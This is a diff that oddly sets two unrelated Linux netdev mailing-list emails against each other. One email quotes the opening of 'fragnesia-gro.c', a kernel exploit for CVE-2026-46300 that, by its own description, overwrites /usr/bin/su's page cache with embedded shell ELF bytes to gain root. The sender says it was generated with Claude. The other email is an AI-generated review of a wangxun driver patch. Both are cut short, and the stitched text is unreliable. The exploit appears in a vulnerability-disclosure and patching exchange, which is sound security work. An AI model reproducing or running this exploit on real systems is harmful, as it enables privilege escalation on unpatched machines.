@@ -1,1031 +1,281 @@
-Return-Path: <netdev+bounces-287874-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-287875-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id 4OfMBp6UBWpLYwIAu9opvQ
-	(envelope-from <netdev+bounces-287874-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 11:23:42 +0200
+	id gG9AL8uUBWpLYwIAu9opvQ
+	(envelope-from <netdev+bounces-287875-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 11:24:27 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
-	by mail.lfdr.de (Postfix) with ESMTPS id 6BFDB53FBA5
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 11:23:40 +0200 (CEST)
+Received: from sin.lore.kernel.org (sin.lore.kernel.org [IPv6:2600:3c15:e001:75::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id C3AC853FBCC
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 11:24:26 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 421D4301589D
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 09:23:11 +0000 (UTC)
+	by sin.lore.kernel.org (Postfix) with ESMTP id 15B1A300FB1A
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 09:24:13 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id C5C76399019;
-	Thu, 14 May 2026 09:23:10 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 22B2639A070;
+	Thu, 14 May 2026 09:24:12 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="BJnL9hFl"
+	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="G5SU/LBW"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-pj1-f45.google.com (mail-pj1-f45.google.com [209.85.216.45])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4866E39A070
-	for <netdev@vger.kernel.org>; Thu, 14 May 2026 09:23:08 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.45
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 42662399007
+	for <netdev@vger.kernel.org>; Thu, 14 May 2026 09:24:10 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.129.124
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778750590; cv=none; b=e85+53YCOf2uynvl0/Usp2stQnfAqMXIEM5q1BRmTNb5nEJcP7TsJDoxhXXRVcT/jLA7dJvtChul534ArfehgNRH8jsCv2yLU/DO4rYW6zfSo+DMlMrGd7guwCclaLlmBV3U0RlyGTX5tlVcFpfyXcaEoBV51qpDONMToOuHKnI=
+	t=1778750652; cv=none; b=QLfFqOz8+GVt3n0dMqby1F5RjFHzGzHasI+uBGKnVDTITF0cc+pLhFXEenqxttQOe2E+HKSmSa3n0RLk3WHwl/ilaZHVYXVMEMgK0gtN4ihADbm8oLnC/TUlC4SoYin5o+meOxFziCG+UZETubcKb6psEYurconL4iLdVBfj2Wo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778750590; c=relaxed/simple;
-	bh=7e5UAnvNfVXDKZfaAd5twH9/Jp+934cnV4mM6/4QD1w=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=C04atdXlkPfanzmj5YWxftesUmSjzPgXcjISCYhXAqS/ezlOGd7d86WfZToiAndVGWPIPa1AD9fmJ4I4/EhtutzfOIrhWIvVtSfEjgNsL034RiJ8KtLnSslw5RARrgooRb+ekL39RhYCVur1u9UEbH2lQJ6vfybycfLZbuoxEKc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=BJnL9hFl; arc=none smtp.client-ip=209.85.216.45
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Received: by mail-pj1-f45.google.com with SMTP id 98e67ed59e1d1-366139223e4so4741340a91.0
-        for <netdev@vger.kernel.org>; Thu, 14 May 2026 02:23:08 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1778750587; x=1779355387; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
-        bh=YTo95gmbrgbQook/kBZqCdBGvj8PpS+QjOCkSgoMewk=;
-        b=BJnL9hFlp4FxkDw0bdGXRoqdy7U7k/m5mhUc78hVeI59sIBVaaxKP8I4imStpEB0Do
-         dshJTjuxtbL24+SxLnA4nZjV+Ccj0Uq0qa38GaibZu5gIjbJsjMaarzeaBrls7r3vwkD
-         9GmYWoTVCpV53K8WUSdxewnEuKbkdurBRxXGnZuQpy1Uq2d/z0ICBmqbA/2lKDx4Y/Ai
-         a89uHHpBbhD9ydT3mvtHEskGMY65h7pIW7NNDMPlk6wLWXRrt7kgQ8tldNujeCeRM7ab
-         WgFAYOsWoDx5JZjaAxBD1CPbvrjmcpcTmRMqKELHJhMexKd5iCXEuCC7j801lUOYC63A
-         DCgA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1778750587; x=1779355387;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=YTo95gmbrgbQook/kBZqCdBGvj8PpS+QjOCkSgoMewk=;
-        b=KACa4xFN8yudLBrWF1V/i8RCpaczEVfc7l5Y5izWXaakq87/vLIoFunajBplOvxB4S
-         PKP5gnBMemylcuTTIR1Vljq97N3nRRNHGeVMHdpid5p0qjJ3FdUmJ6benfR6bOyUEeMJ
-         BZY0nv0mVmZX7CvNrko/zlX195PFkkh6Gcg5Gic3CTMmdRvhXRUF0qshQDxW0kMygbEl
-         W7xKOWkNg0m6VpX2nGa8Nb73LmOPXMtmHaRqiZGvNB7jUPbIDbf/JwlkG9tBJiVYHjvr
-         Z2IrbmfE6aCKICiYHTIRsZlj/kvvFm9irBEEMjHHeRZuLikReukso5vbg7SEQdoL+0ws
-         p/GA==
-X-Forwarded-Encrypted: i=1; AFNElJ8/cmZwGbQ2GjOOWAsuGN3NcJb6ST1TR/n1N7i6Y0GWC0X9uw87aOr+RrMPqpb5gF23n4KWaiA=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwqvqWyb1RATRF/jZYf22AgqEF6RwieoJmE4D2WMxW8Y9rZ1zUc
-	CjFmz8CPT4qzmtAHpuvUONxb+6zPn0nSkXjwd/JaSeHev12Jo2xXESVmLjU9AKyZ
-X-Gm-Gg: Acq92OFuLMpd4Nh4LRZogAVgogNV0PrTpHwn3cDBUHh8l2MGOHJfDcub5yXHByCZhoR
-	qwbK+UWg//y6i8yDXQQywzZ0U/Uo10gIeORDCSG5JVLu9zNwB5d2Bz3ExJ67j4bQDBUtKGDuY5b
-	tMRX3fUy0cGhT+9nasz6gdVsCKfhpT/VvicPK2ph02piGBgfkYpyZVehtlzI+WhDDo3ze+cPOZn
-	FLzWHuy8ZA7vSM2dRXFOTnLNpt5sN3cmKkC3AO9qb3e65OpgFW5gd8XcNTOKE4g3WF2HzOCfIVZ
-	Jk3z+I1u0+oqRSj3gHdtNsMLyLjav7bOG92HrzoaINZvYQwT4EnGhh+yfAxGQqlGPj4oW509B0c
-	GHu4pgMWLga4B9T4J5fswuGUZftPNsn26iQ3v3hKs7jhoft4+Zrq02d5oq0R6unOFmjmRG/z5wK
-	wrkN1y282rl4wgxL2jCFDumjzrNSBNZJinzzBBZAijmW0=
-X-Received: by 2002:a17:90a:fc44:b0:366:aba:4c86 with SMTP id 98e67ed59e1d1-368f3e62d47mr8134769a91.27.1778750587204;
-        Thu, 14 May 2026 02:23:07 -0700 (PDT)
-Received: from v4bel ([58.123.110.97])
-        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-c82bb062695sm1719348a12.4.2026.05.14.02.23.03
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 14 May 2026 02:23:06 -0700 (PDT)
-Date: Thu, 14 May 2026 18:23:02 +0900
-From: Hyunwoo Kim <imv4bel@gmail.com>
-To: Sultan Alsawaf <sultan@kerneltoast.com>
-Cc: davem@davemloft.net, edumazet@google.com, kuba@kernel.org,
-	pabeni@redhat.com, horms@kernel.org, kerneljasonxing@gmail.com,
-	kuniyu@google.com, mhal@rbox.co, jiayuan.chen@linux.dev,
-	steffen.klassert@secunet.com, vakzz@zellic.io, ben@decadent.org.uk,
-	herbert@gondor.apana.org.au, dsahern@kernel.org,
-	netdev@vger.kernel.org, stable@vger.kernel.org, imv4bel@gmail.com
-Subject: Re: [PATCH net v2] net: skbuff: propagate shared-frag marker through
- frag-transfer helpers
-Message-ID: <agWUdie1xBvBu22I@v4bel>
-References: <agToIEDI4TaTNLRb@v4bel>
- <agVpIsaSherjHTYg@sultan-box>
+	s=arc-20240116; t=1778750652; c=relaxed/simple;
+	bh=fpTH+nIt3dpOZScMWmumD99eTm9JG+U/OuMfSOpsDJ4=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=PZ05zaYx+9VvGzaMDf7x+SzrlMs6LQm1g7rs7PKe7YEfZV0E+LYrvotNbqkjH7l6+yli6NwOkEy/kdOLb3pL6AAhmMkZ+v8ROIxWY4RrtR8JFXn1kqgd1jVrHnqfZ7r1lbKhbGhaWXGIbNlDZWEH3WXwVMnTGZtW3zYNGT2Wsrs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=G5SU/LBW; arc=none smtp.client-ip=170.10.129.124
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1778750649;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references;
+	bh=UAb+nCHzeS/VFm4KncSYdknD7kA3Pr4qWEBvMKTKggI=;
+	b=G5SU/LBWOg63OH4HExUiELmp32EBwg7yvALmE6ACCwrUD28g85mpHEXJ1+KockJRDVoJtm
+	CbsBaAYQuGWcABHTPP2quaHJHcf4xQqn1yH5rFjN+DsN1xp9Ls0P/gEylbKe1WB9UxpNq5
+	f1FXnqnHrLq61mRPGPFQEjIWkLMqMSY=
+Received: from mx-prod-mc-05.mail-002.prod.us-west-2.aws.redhat.com
+ (ec2-54-186-198-63.us-west-2.compute.amazonaws.com [54.186.198.63]) by
+ relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.3,
+ cipher=TLS_AES_256_GCM_SHA384) id us-mta-711-jY02ZgFWPIiwBAfN5hJ71Q-1; Thu,
+ 14 May 2026 05:24:03 -0400
+X-MC-Unique: jY02ZgFWPIiwBAfN5hJ71Q-1
+X-Mimecast-MFC-AGG-ID: jY02ZgFWPIiwBAfN5hJ71Q_1778750641
+Received: from mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com (mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com [10.30.177.4])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by mx-prod-mc-05.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTPS id 4EF521956080;
+	Thu, 14 May 2026 09:24:00 +0000 (UTC)
+Received: from gerbillo.redhat.com (unknown [10.44.32.197])
+	by mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTP id 7956E30001A2;
+	Thu, 14 May 2026 09:23:54 +0000 (UTC)
+From: Paolo Abeni <pabeni@redhat.com>
+To: jiawenwu@trustnetic.com
+Cc: netdev@vger.kernel.org,
+	mengyuanlou@net-swift.com,
+	andrew+netdev@lunn.ch,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	richardcochran@gmail.com,
+	linux@armlinux.org.uk,
+	horms@kernel.org,
+	kees@kernel.org,
+	larysa.zaremba@intel.com,
+	leitao@debian.org,
+	joe@dama.to,
+	jacob.e.keller@intel.com,
+	fabio.baltieri@gmail.com
+Subject: Re: [PATCH net-next v3 2/5] net: wangxun: add Tx timeout process
+Date: Thu, 14 May 2026 11:23:46 +0200
+Message-ID: <20260514092346.90833-1-pabeni@redhat.com>
+In-Reply-To: <20260509100540.32612-3-jiawenwu@trustnetic.com>
+References: <20260509100540.32612-3-jiawenwu@trustnetic.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <agVpIsaSherjHTYg@sultan-box>
-X-Rspamd-Queue-Id: 6BFDB53FBA5
+Content-Transfer-Encoding: 8bit
+X-Scanned-By: MIMEDefang 3.4.1 on 10.30.177.4
+X-Rspamd-Queue-Id: C3AC853FBCC
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [-1.66 / 15.00];
+X-Spamd-Result: default: False [0.84 / 15.00];
+	SUSPICIOUS_RECIPS(1.50)[];
 	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	MID_RHS_NOT_FQDN(0.50)[];
-	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
-	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
-	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
+	MID_CONTAINS_FROM(1.00)[];
+	R_MISSING_CHARSET(0.50)[];
+	DMARC_POLICY_ALLOW(-0.50)[redhat.com,quarantine];
+	R_DKIM_ALLOW(-0.20)[redhat.com:s=mimecast20190719];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c15:e001:75::/64:c];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	RCVD_TLS_LAST(0.00)[];
-	TAGGED_FROM(0.00)[bounces-287874-lists,netdev=lfdr.de];
-	FORGED_SENDER_MAILLIST(0.00)[];
 	MIME_TRACE(0.00)[0:+];
-	FREEMAIL_CC(0.00)[davemloft.net,google.com,kernel.org,redhat.com,gmail.com,rbox.co,linux.dev,secunet.com,zellic.io,decadent.org.uk,gondor.apana.org.au,vger.kernel.org];
-	FREEMAIL_FROM(0.00)[gmail.com];
-	RCPT_COUNT_TWELVE(0.00)[18];
-	FROM_HAS_DN(0.00)[];
+	TAGGED_FROM(0.00)[bounces-287875-lists,netdev=lfdr.de];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	FREEMAIL_CC(0.00)[vger.kernel.org,net-swift.com,lunn.ch,davemloft.net,google.com,kernel.org,redhat.com,gmail.com,armlinux.org.uk,intel.com,debian.org,dama.to];
+	RCVD_TLS_LAST(0.00)[];
+	DKIM_TRACE(0.00)[redhat.com:+];
+	ASN(0.00)[asn:63949, ipnet:2600:3c15::/32, country:SG];
 	MISSING_XM_UA(0.00)[];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[imv4bel@gmail.com,netdev@vger.kernel.org];
-	DKIM_TRACE(0.00)[gmail.com:+];
+	FROM_NEQ_ENVFROM(0.00)[pabeni@redhat.com,netdev@vger.kernel.org];
+	FROM_HAS_DN(0.00)[];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	RCVD_COUNT_FIVE(0.00)[6];
 	NEURAL_HAM(-0.00)[-1.000];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
+	TO_DN_NONE(0.00)[];
+	RCPT_COUNT_TWELVE(0.00)[17];
 	TAGGED_RCPT(0.00)[netdev];
-	TO_DN_SOME(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[kerneltoast.com:email,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,anthropic.com:email]
+	DBL_BLOCKED_OPENRESOLVER(0.00)[linux.dev:url,sin.lore.kernel.org:helo,sin.lore.kernel.org:rdns]
 X-Rspamd-Action: no action
 
-On Wed, May 13, 2026 at 11:18:10PM -0700, Sultan Alsawaf wrote:
-> On Thu, May 14, 2026 at 06:07:44AM +0900, Hyunwoo Kim wrote:
-> > Changes in v2:
-> > - Also propagate SHARED_FRAG in skb_shift()
-> > - v1: https://lore.kernel.org/all/agRfuVOeMI5pbHhY@v4bel/
-> 
-> Hi Hyunwoo,
-> 
-> I've been working on mitigating this vulnerability as a member of the kernel
-> team at CIQ, a distro vendor. In particular, we wanted to make sure that there
-> weren't any lingering places missing SHARED_FRAG propagation.
-> 
-> To that end, I used Claude to discover that skb_gro_receive() remained unpatched
-> (as you pointed out in the v1 thread). And then I generated a PoC exploiting the
-> vulnerable skb_gro_receive() path.
-> 
-> The PoC is a modified version of the original fragnesia PoC. It works 100% of
-> the time, just like the original fragnesia PoC.
-> 
-> I have attached the PoC and a patch that fixes skb_gro_receive(). Please take a
-> look at them.
-> 
-> Thanks,
-> Sultan
+From: AI Reviewer <ai@example.com>
 
-Nice catch. Thank you.
+This is an AI-generated review of your patch. The human sending this
+email has considered the AI review valid, or at least plausible.
+Full review at: https://netdev-ai.bots.linux.dev/sashiko/
+---
+net: wangxun: add Tx timeout process
 
-After testing, I plan to merge your patch with v2 into a single patch (not a 
-series) and submit it as v3. I would appreciate it if you could then add an 
-appropriate credit tag of your own.
+This patch implements .ndo_tx_timeout for the wangxun drivers (ngbe and
+txgbe). On a Tx timeout it sets WX_FLAG_NEED_PF_RESET and the service
+task picks the flag up and calls wx->do_reset() under rtnl_lock().
 
-Also, I would appreciate it if you could use AI to explore additional 
-propagation variant paths. From my own analysis, no further ones have been 
-identified.
-
-
-Best regards,
-Hyunwoo Kim
-
-
-> /*
->  * fragnesia-gro.c: skb_gro_receive() SKBFL_SHARED_FRAG page-cache corruption PoC
->  *
->  * Drop-in replacement for the espintcp fragnesia variant, targeting the same
->  * bug class (CVE-2026-46300) through the GRO frag-merge path instead of the
->  * espintcp path. Copies shell_elf over /usr/bin/su's page cache the same way
->  * the original fragnesia does.
->  *
->  * The exploit splices 17 bytes per round (1 byte ciphertext + 16 byte ICV) so
->  * each ESP decrypt corrupts exactly ONE target byte with no collateral damage.
->  * A precomputed IV table selects the AES-GCM keystream byte that XORs the
->  * current file content to the desired shell_elf byte.
->  *
->  * Based on the Fragnesia PoC by William Bowling / Hyunwoo Kim.
->  *
->  * Build:
->  *   gcc -O2 -Wall -Wextra -static fragnesia-gro.c -o fragnesia-gro
->  *
->  * Run (as root):
->  *   ./fragnesia-gro
->  *
->  * Exit codes:
->  *   1: vulnerable (page cache mutated through GRO flag-strip path)
->  *   0: fixed (byte unchanged)
->  *   2: local setup or argument error
->  *   4: namespace/veth gate closed
->  */
-> 
-> #define _GNU_SOURCE
-> 
-> #include <arpa/inet.h>
-> #include <errno.h>
-> #include <fcntl.h>
-> #include <limits.h>
-> #include <net/if.h>
-> #include <netinet/in.h>
-> #include <sched.h>
-> #include <signal.h>
-> #include <stdbool.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/ioctl.h>
-> #include <sys/mount.h>
-> #include <sys/socket.h>
-> #include <sys/stat.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <time.h>
-> #include <sys/wait.h>
-> #include <unistd.h>
-> #include <linux/bpf.h>
-> #include <linux/if_addr.h>
-> #include <linux/if_alg.h>
-> #include <linux/netlink.h>
-> #include <linux/xfrm.h>
-> 
-> /* ---- compat defines ---- */
-> 
-> #ifndef NLA_ALIGNTO
-> #define NLA_ALIGNTO 4
-> #endif
-> #define NLA_ALIGN(len)  (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
-> #ifndef NLA_HDRLEN
-> #define NLA_HDRLEN      ((int)NLA_ALIGN(sizeof(struct nlattr)))
-> #endif
-> #ifndef RTM_NEWLINK
-> #define RTM_NEWLINK 16
-> #endif
-> #ifndef RTM_NEWADDR
-> #define RTM_NEWADDR 20
-> #endif
-> #ifndef NETLINK_ROUTE
-> #define NETLINK_ROUTE 0
-> #endif
-> #ifndef NETLINK_XFRM
-> #define NETLINK_XFRM 6
-> #endif
-> #ifndef IFLA_IFNAME
-> #define IFLA_IFNAME 3
-> #endif
-> #ifndef IFLA_LINKINFO
-> #define IFLA_LINKINFO 18
-> #endif
-> #ifndef IFLA_INFO_KIND
-> #define IFLA_INFO_KIND 1
-> #endif
-> #ifndef IFLA_INFO_DATA
-> #define IFLA_INFO_DATA 2
-> #endif
-> #ifndef VETH_INFO_PEER
-> #define VETH_INFO_PEER 1
-> #endif
-> #ifndef IFLA_NET_NS_PID
-> #define IFLA_NET_NS_PID 19
-> #endif
-> #ifndef IFA_LOCAL
-> #define IFA_LOCAL 2
-> #endif
-> #ifndef IFA_ADDRESS
-> #define IFA_ADDRESS 1
-> #endif
-> #ifndef NLA_F_NESTED
-> #define NLA_F_NESTED (1 << 15)
-> #endif
-> #ifndef ETHTOOL_SGRO
-> #define ETHTOOL_SGRO 0x0000002c
-> #endif
-> #ifndef ETHTOOL_STSO
-> #define ETHTOOL_STSO 0x0000001f
-> #endif
-> #ifndef ETHTOOL_SGSO
-> #define ETHTOOL_SGSO 0x00000024
-> #endif
-> #ifndef SIOCETHTOOL
-> #define SIOCETHTOOL 0x8946
-> #endif
-> #ifndef UDP_ENCAP
-> #define UDP_ENCAP 100
-> #endif
-> #ifndef UDP_ENCAP_ESPINUDP
-> #define UDP_ENCAP_ESPINUDP 2
-> #endif
-> #ifndef UDP_GRO
-> #define UDP_GRO 104
-> #endif
-> #ifndef UDP_CORK
-> #define UDP_CORK 1
-> #endif
-> #ifndef AF_ALG
-> #define AF_ALG 38
-> #endif
-> #ifndef SOL_ALG
-> #define SOL_ALG 279
-> #endif
-> #ifndef ALG_SET_KEY
-> #define ALG_SET_KEY 1
-> #endif
-> #ifndef ALG_SET_OP
-> #define ALG_SET_OP 3
-> #endif
-> #ifndef ALG_OP_ENCRYPT
-> #define ALG_OP_ENCRYPT 1
-> #endif
-> #ifndef IFLA_XDP
-> #define IFLA_XDP 43
-> #endif
-> #ifndef IFLA_XDP_FD
-> #define IFLA_XDP_FD 1
-> #endif
-> #ifndef IFLA_XDP_FLAGS
-> #define IFLA_XDP_FLAGS 3
-> #endif
-> #ifndef XDP_FLAGS_SKB_MODE
-> #define XDP_FLAGS_SKB_MODE (1U << 1)
-> #endif
-> 
-> struct rtnl_ifinfomsg {
-> 	unsigned char  ifi_family;
-> 	unsigned char  __ifi_pad;
-> 	unsigned short ifi_type;
-> 	int            ifi_index;
-> 	unsigned int   ifi_flags;
-> 	unsigned int   ifi_change;
-> };
-> 
-> /* ---- constants ---- */
-> 
-> #define VETH0       "veth0"
-> #define VETH1       "veth1"
-> #define ADDR_SRC    "10.0.0.1"
-> #define ADDR_DST    "10.0.0.2"
-> #define UDP_PORT    4500
-> #define ESP_SPI     0x100
-> #define ICV_LEN     16
-> #define PAYLOAD_LEN 192
-> /*
->  * Splice exactly 17 bytes per round: rfc4106 shifts the 8-byte IV into
->  * the AAD, so the inner GCM sees SPLICE_LEN bytes of ciphertext. With
->  * SPLICE_LEN - ICV_LEN = 1, exactly one frag byte is decrypted.
->  */
-> #define SPLICE_LEN  (1 + ICV_LEN)
-> 
-> static const unsigned char xfrm_key[20] = {
-> 	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
-> 	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
-> 	0x01, 0x02, 0x03, 0x04
-> };
-> 
-> static const uint8_t shell_elf[PAYLOAD_LEN] = {
-> 	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> 	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
-> 	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> 	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> 	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> 	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
-> 	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> 	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
-> 	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
-> 	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
-> 	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
-> 	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-> };
-> 
-> static const char *target_file = "/usr/bin/su";
-> 
-> /* ---- utility ---- */
-> 
-> static void die(const char *w) { fprintf(stderr, "%s: %s\n", w, strerror(errno)); exit(2); }
-> static void gate_fail(const char *w) { fprintf(stderr, "gate_closed: %s: %s\n", w, strerror(errno)); exit(4); }
-> 
-> static void store_be32(unsigned char *p, uint32_t v)
-> {
-> 	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
-> }
-> 
-> static void sync_write(int fd) { unsigned char b = 1; if (write(fd, &b, 1) != 1) die("sync_write"); }
-> static void sync_read(int fd)  { unsigned char b; if (read(fd, &b, 1) != 1) die("sync_read"); }
-> 
-> static unsigned char read_byte_at(int fd, off_t off)
-> {
-> 	unsigned char b;
-> 	if (pread(fd, &b, 1, off) != 1) die("pread");
-> 	return b;
-> }
-> 
-> /* ---- netlink helpers ---- */
-> 
-> static int nl_ack_errno(char *buf, ssize_t len)
-> {
-> 	struct nlmsghdr *nlh;
-> 	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
-> 	     nlh = NLMSG_NEXT(nlh, len)) {
-> 		if (nlh->nlmsg_type == NLMSG_ERROR) {
-> 			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
-> 			if (e->error == 0) return 0;
-> 			errno = -e->error;
-> 			return -1;
-> 		}
-> 	}
-> 	errno = EPROTO;
-> 	return -1;
-> }
-> 
-> static void add_nlattr(struct nlmsghdr *nlh, size_t max,
-> 		       unsigned short type, const void *data, size_t len)
-> {
-> 	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
-> 	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
-> 	if (off + NLA_HDRLEN + len > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
-> 	nla->nla_type = type;
-> 	nla->nla_len = NLA_HDRLEN + len;
-> 	memcpy((char *)nla + NLA_HDRLEN, data, len);
-> 	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
-> }
-> 
